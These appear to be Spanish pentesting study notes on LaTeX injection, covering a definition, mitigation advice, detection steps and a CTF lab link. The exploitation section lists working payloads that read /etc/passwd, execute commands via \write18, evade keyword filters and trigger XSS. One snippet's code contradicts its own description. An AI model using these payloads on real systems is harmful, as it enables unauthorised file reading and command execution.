---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #LaTeX #exploiting 
--------------

# Definición
   
> Los ataques de **LaTeX Injection** implican la inserción de comandos LaTeX maliciosos en campos de entrada o contenido web, lo que puede llevar a la ejecución de código no autorizado o a la generación de contenido peligroso en documentos. 
> 
> Un ejemplo de este tipo de inyección podría ser un ataque que aproveche la capacidad de LaTeX para **incluir gráficos y archivos** en una aplicación. El atacante podría enviar un código en LaTeX que incluya un enlace a un archivo malicioso que podría infectar el servidor.
> 
> Para evitar las inyecciones LaTeX, las aplicaciones web deben **validar y limpiar** adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX. Además es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red, además de monitorizar regularmente las actividades para detectar posibles inyecciones.

----------
# Detección de vulnerabilidad 

- **Revisar la funcionalidad LaTeX**: Identifica las partes de la aplicación web donde los usuarios pueden ingresar o cargar contenido LaTeX. Estas partes pueden ser campos de entrada, área de carga de archivos y más.
- **Entrada de prueba**: Introduce una fórmula LaTeX de prueba, para confirmar que se están procesando las fórmulas LaTeX.
- **Entrada maliciosa**: Intenta ingresar una fórmula LaTeX maliciosa que contenga comandos o secuencias de escape peligrosas. Algunos ejemplos de comandos LaTeX peligrosos incluyen `\input`, `\include`, `\includegraphics`, entre otros. 
- **Observe la respuesta**: Examina la respuesta de la aplicación web. Si la página muestra errores, mensajes inesperados o se comporta de manera anormal después de ingresar la fórmula LaTeX maliciosa, es posible que hayas encontrado una vulnerabilidad de inyección de LaTeX.
----------
# Explotación

Una vez descubierta la vulnerabilidad, podemos intentar inyectar distintos [[Payload]] para intentar conseguir información del sistema.
## Lectura de archivos

Para leer un archivo y mostrarlo en el archivo generado:

```
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

Para leer una única línea de un archivo:

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

Para leer múltiples líneas de un archivo:

```
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Esto puede petar, ya que hay caracteres que entran en conflicto con LaTeX. Para ello, podemos utilizar un script para mostrar únicamente las líneas que sí se puedan leer.

## Ejecución de comandos

``` 
\immediate\write18{id > output}
\input{output}
```

En el caso en el que no podamos ejecutar  \input, podemos utilizar los distintos métodos vistos anteriormente para la lecutra del archivo output, por ejemplo:

```
\immediate\write18{id > output}
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

También puede ser que hayan distintos directorios que podemos encontrar, por ejemplo con [[Gobuster]], en el que se guardan dichos archivos. Entonces podríamos generar el output del comando como lo estábamos haciendo y acceder al subdirectorio, como /compile, para poder leerlo.

## Burlar restricción de entrada

Si hay palabras o comandos que están censurados, podemos tratar de realizar lo siguiente para intentar ignorar la restricción. Suponiendo que la palabra es "pepito", podemos descomponer la palabra en "pep" y "ito", de manera que si lo unimos conseguimos la palabra censurada:

```
\def\first{pep}
\def\second{ito}
\first\second
```
## [[XSS (Cross-Site Scripting)]]

Podemos tratar de dirigir el ataque a un [[XSS (Cross-Site Scripting)]], para probar si es vulnerable, podemos intentar los siguientes payloads:

```
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
--------------
# Ejemplos prácticos

- **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)